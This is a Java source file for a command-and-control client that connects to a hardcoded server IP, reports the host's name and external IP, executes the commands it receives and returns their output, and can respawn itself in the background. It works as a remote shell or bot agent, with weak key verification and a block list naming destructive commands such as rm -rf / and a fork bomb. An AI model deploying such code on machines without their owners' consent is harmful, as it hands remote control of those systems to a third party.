import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryonet.Client;
import com.esotericsoftware.kryonet.Connection;
import com.esotericsoftware.kryonet.Listener;

import java.io.*;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.PublicKey;
import java.util.Arrays;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class Main {

    /**
     * @title CNCClientModule
     * @author Kaveen Kumarasinghe
     * @date 06/24/2019
     * <p>
     * This is the counterpart of the CNCCommandModule. This client connects to, and receives commands from the CNCCM at https://github.com/Kav-K/CNCCommandModule
     * <p>
     * This project uses the KryoNet library from EsotericSoftware (https://github.com/EsotericSoftware/kryonet)
     * Please keep in mind that KryoNet is built upon Java NIO, and has a (mostly) asynchronous approach to message transmission and reception.
     */
    //Private and Public key locations

    static final String PRIVATE_KEY_FILE = "CNCKeys/privateKey";
    static final String PUBLIC_KEY_FILE = "CNCKeys/publicKey";


    //Adjust this accordingly to limit/unlimit the amount of data that can be sent to command in the form of a CommandResponse.
    public static final int WRITEBUFFER = 50 * 1024;
    public static final int OBJECTBUFFER = 50 * 1024;

    //The COMMANDIP and COMMANDPORT designate the public, forward-facing ipv4 address and port of the CNCCommandModule server.
    private static final String COMMANDIP = "178.128.231.167";
    private static final int COMMANDPORT = 83;

    static Client client;
    //AuthenticationStatusLock prevents keepalive transmissions from the command from changing the authentication status to true, in the event of a manual reconnection request!
    private static boolean authenticationStatusLock = false;
    private static boolean authenticated = false;

    //List of classes to be registered with kryo for (de)serialization
    public static final List<Class> KRYO_CLASSES = Arrays.asList(BackgroundInitializer.class,byte[].class,PublicKeyTransmission.class, KeyRequest.class, ReconnectRequest.class, AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class, KillRequest.class);


    //TODO More substantial way to block unsafe commands
    public static List<String> blockedCommands = Arrays.asList("rm -rf /", "rm -rf /home", ":(){ :|:& };:", "shutdown", "> /dev/sda", "/dev/null", "/dev/sda", "dd if=/dev/random of=/dev/sda", "/dev/random", "/root/,ssh", "ssh-copy-id", "ssh");

    //File Lock
    static Lock lock;

    public static void main(String[] args) {
        if (checkLock()) {
            failoverUtil();

            initialize();
        } else {
            Main.error("Instance already running, exiting");
            System.exit(0);

        }




    }

    private static boolean checkLock() {
        lock = new Lock();
        if (lock.getLock()==null) {
            return false;
        } else {
            return true;
        }



    }


    private static RegisterRequest craftRegisterRequest() {
        String hostname = "null";
        String ipAddress = "null";
        try {
            hostname = InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            e.printStackTrace();
            error("Unable to obtain hostname");
            System.exit(0);
        }
        try {
            ipAddress = getIp();

        } catch (Exception e) {
            e.printStackTrace();
            error("Unable to obtain host address");
            System.exit(0);
        }
        return new RegisterRequest(hostname, ipAddress);


    }


    private static void initialize() {


        log("Initializing client");
        client = new Client(WRITEBUFFER, OBJECTBUFFER);
        client.start();
        try {
            log("Connecting client to command");
            client.connect(5000, COMMANDIP, COMMANDPORT);
            log("Connected to command");
            registerClasses();

        } catch (Exception e) {
            e.printStackTrace();
            error("Unable to connect to  command");
            System.exit(0);
        }
        pseudoSecurelyObtainPublicKey();

        /*
        This listener functions as an authentication confirmation receiver, and as well as a makeshift status checker for the command server.
        coupled together with startKeepAliveCheck()
         */
        startListeners();


    }
    /*
    Listens for a public key transmission from the server and writes it to a file if received.
     */

    private static void startPublicKeyTransmissionListener() {
        client.addListener(new Listener() {
            public void received(Connection connection, Object object) {
                if (object instanceof PublicKeyTransmission) {
                    PublicKeyTransmission publicKeyTransmission = (PublicKeyTransmission)object;
                    log("Received public key transmission");
                    if (publicKeyTransmission.getIpAddress().equals(COMMANDIP)) {
                        log("Verified public key is from COMMANDIP");


                        String strFilePath = "CNCKeys/publicKey";
                        log("Attempting to write public key to file at "+strFilePath);
                        try {
                            new File("CNCKeys").mkdirs();
                            FileOutputStream fos = new FileOutputStream(strFilePath);
                            for (byte b:publicKeyTransmission.getStream()) {
                                System.out.println((char)b);
                            }
                            fos.write(publicKeyTransmission.getStream());
                            fos.close();
                            log("Successfully wrote byte stream to file");
                            log("Initializing main program");

                        }
                        catch(FileNotFoundException ex)   {
                            System.out.println("FileNotFoundException : " + ex);
                            error("Failed to find file");
                            client.stop();
                            System.exit(0);
                        }
                        catch(IOException ioe)  {
                            ioe.printStackTrace();
                            System.out.println("IOException : " + ioe);
                            error("Error while writing byte stream to file");
                            client.stop();
                            System.exit(0);
                        }



                    }


                }
            }
        });
    }
    private static void startBackgroundInitializerListener() {
        client.addListener(new Listener() {
            public void received(Connection connection, Object object) {

                if (object instanceof BackgroundInitializer) {
                    BackgroundInitializer bgI = (BackgroundInitializer) object;
                    try {
                        if (!bgI.verify()) {
                            error("Invalid authenticity");
                            return;

                        } else {
                            log("Authenticity of BGI validated");

                            //Start running
                            log("Killing non-background process and starting as background");
                            Runtime.getRuntime().exec("java -jar cncclient.jar &");
                            log("Successfully started new instance, exiting");
                            try {
                                lock.getLock().release();
                                log("Released lock");
                            } catch (Exception e) {
                                error("Unable to release lock");
                                e.printStackTrace();

                            }

                            System.exit(0);


                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        error("Unable to verify the authenticity of BackgroundInitializer from server");
                    }


                }


            }
        });





    }


    /*
    Listens for commands sent from the command server and attempts to execute them, returns a CommandResponse!
     */
    private static void startCommandListener() {

        client.addListener(new Listener() {
            public void received(Connection connection, Object object) {
                if (object instanceof Command) {
                    //if (!authenticated) return;




                    Command command = (Command) object;
                    try {
                        if (!command.verify()) {
                             error("Invalid authenticity");
                             return;
                        } else {
                            log("Authenticity signature of command validated");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        error("Unable to verify authenticity of command from server");
                         System.exit(0);
                    }

                    commandLog(command.getCommand());
                    for (String s : blockedCommands) {
                        if (command.getCommand().toLowerCase().contains(s)) {
                            error("Blocked command was attempted: " + command.getCommand());
                            return;
                        }
                    }

                    try {
                        String output = executeCommand(command.getCommand());
                        log("Executed Command");
                        log("OUTPUT: " + output);
                        if (output.isEmpty()) {
                            output = "OK";
                        }
                        client.sendTCP(new CommandResponse(output));

                    } catch (Exception e) {
                        e.printStackTrace();
                        error(e.getMessage());
                        error("Could not execute command: " + command.getCommand());
                        client.sendTCP(new CommandResponse(e.getMessage()));

                    }


                } else if (object instanceof BackgroundInitializer) {


                }
            }
        });

    }

    /*
    Check the status of the authenticated variable, and if it is false, start the reconnection task to attempt constant
    reconnections to the server. If it is set to true set it to false and let it be updated back to true by the command server
     */
    private static void startKeepAliveCheck() {
        Timer timer = new Timer("Timer");
        log("Starting authentication checker");
        TimerTask task = new TimerTask() {

            public void run() {
                if (!authenticated) {
                    error("Client is no longer authenticated with command. Starting reconnection thread");
                    startReconnectionThread();
                    this.cancel();
                } else {

                    authenticated = false;


                }


            }


        };

        //TODO More substantial way of handling these timers, but it works flawlessly for now.
        timer.scheduleAtFixedRate(task, 2000, 5000);


    }

    private static void startListeners() {
        client.addListener(new Listener() {
            public void received(Connection connection, Object object) {
                if (object instanceof AuthenticationConfirmation) {
                    if ((!authenticationStatusLock) && connection.getRemoteAddressTCP().getAddress().getHostAddress().equals(COMMANDIP))
                        authenticated = true;
                    log("Successfully authenticated by command");

                } else if (object instanceof KeepAlive && connection.getRemoteAddressTCP().getAddress().getHostAddress().equals(COMMANDIP)) {
                    if (!authenticationStatusLock)
                        authenticated = true;
                }
            }
        });
        client.sendTCP(craftRegisterRequest());
        log("Sent authentication request");
        startKeepAliveCheck();
        startCommandListener();
        startKillListener();
        startReconnectRequestListener();
        startBackgroundInitializerListener();

    }

    private static void startReconnectRequestListener() {

        client.addListener(new Listener() {
            public void received(Connection connection, Object object) {
                if (object instanceof ReconnectRequest) {
                    ReconnectRequest request = (ReconnectRequest) object;
                    try {
                        log("Verifying authenticity of ReconnectRequest");
                        if (!request.verify()) {
                            Main.error("Invalid ReconnectRequest authenticity");
                            return;

                        } else {
                            log("Authenticity of ReconnectRequest verified");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        error("Unable to verify authenticity of the reconnectrequest");
                        System.exit(0);
                    }





                    try {
                        log("Attempting soft-kryonet reconnection to command server");
                        authenticated = false;
                        authenticationStatusLock = true;


                    } catch (Exception e) {
                        error(e.getMessage());
                        error("Could not reconnect to command server");

                    }


                }

            }

        });
    }


    /*
    Listens for a kill message from COMMAND
     */
    private static void startKillListener() {

        client.addListener(new Listener() {
            public void received(Connection connection, Object object) {
                if (object instanceof KillRequest) {
                    KillRequest killRequest = (KillRequest) object;
                    if (killRequest.destroy) {
                        //TODO Destroy the client
                    } else {
                        log("KILL REQUEST RECEIVED BY COMMAND. GRACEFULLY EXITING");
                        error("KILL REQUEST RECEIVED BY COMMAND. GRACEFULLY EXITING");
                        client.stop();
                        client.close();
                        try {
                            lock.getLock().release();
                            log("Released file lock");
                        } catch (Exception e) { error("Unable to release file lock");}
                        System.exit(0);

                    }


                }
            }
        });
    }

    private static void reconnect() throws Exception {


        error("Reconnect initiated, destroying old client instance");
        client.close();
        client.stop();
        log("Attempting connection to command server");
        client = new Client(WRITEBUFFER, OBJECTBUFFER);
        client.start();
        registerClasses();
        client.connect(3000, COMMANDIP, COMMANDPORT);

        log("Successfully reconnected to command");
        pseudoSecurelyObtainPublicKey();

        startListeners();


    }

    private static void startReconnectionThread() {


        Timer timer = new Timer("Timer");
        TimerTask task = new TimerTask() {
            public void run() {
                try {
                    authenticationStatusLock = false;
                    reconnect();

                    this.cancel();

                } catch (Exception e) {
                    error(e.getMessage());
                    error("Unable to connect to command");

                }

            }


        };
        timer.scheduleAtFixedRate(task, 0, 5000);


    }

    public static final String ANSI_PURPLE = "\u001B[35m";
    public static final String ANSI_CYAN = "\u001B[36m";
    public static final String ANSI_WHITE = "\u001B[37m";
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_BLACK = "\u001B[30m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_GREEN = "\u001B[32m";
    public static final String ANSI_YELLOW = "\u001B[33m";
    public static final String ANSI_BLUE = "\u001B[34m";

    public static void log(String message) {
        System.out.println(ANSI_GREEN + "[Client] " + ANSI_RESET + message);
    }

    public static void error(String message) {
        System.out.println(ANSI_RED + "[Client] " + ANSI_RESET + message);
    }

    public static void commandLog(String message) {
        System.out.println(ANSI_BLUE + "[RECEIVED COMMAND] " + ANSI_RESET + message);
    }

    /*
    It is required to use an external service like amazonaws because it is not possible to programatically obtain the external ipv4
    address of a machine under NAT
     */
    public static String getIp() throws IOException {
        URL whatismyip = new URL("http://checkip.amazonaws.com");
        BufferedReader in = null;
        try {
            in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = in.readLine();
            return ip;
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static String executeCommand(String cmd) throws java.io.IOException {
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }

    private static void registerClasses() {
        log("Registering classes for serialization/deserialization with kryo");
        Kryo kryo = client.getKryo();
        for (Class c : KRYO_CLASSES) kryo.register(c);
        log("Registered kryo classes");
    }

    /*
   Send a request to the server to obtain a copy of its public key. Verify that it is the actual, proper server that we are connecting to
    (somehow)?
    //TODO A more thorough and cryptographically secure implementation of communication security
    */
    private static void pseudoSecurelyObtainPublicKey() {
        try {

            log("Attempting to obtain public key");
            startPublicKeyTransmissionListener();
            log("Sending KeyRequest");
            client.sendTCP(new KeyRequest(getIp(), InetAddress.getLocalHost().getHostName()));
            log("Sent KeyRequest");

        } catch (IOException e) {
            e.printStackTrace();
            error("Client could not connect to command or craft KeyRequest");
            System.exit(0);
        }


    }

    private static void failoverUtil() {
        Timer timer = new Timer("Timer");
        TimerTask task = new TimerTask() {
            public void run() {
                //TODO failovers
            }
        };

        timer.scheduleAtFixedRate(task,0,100000);



    }


}
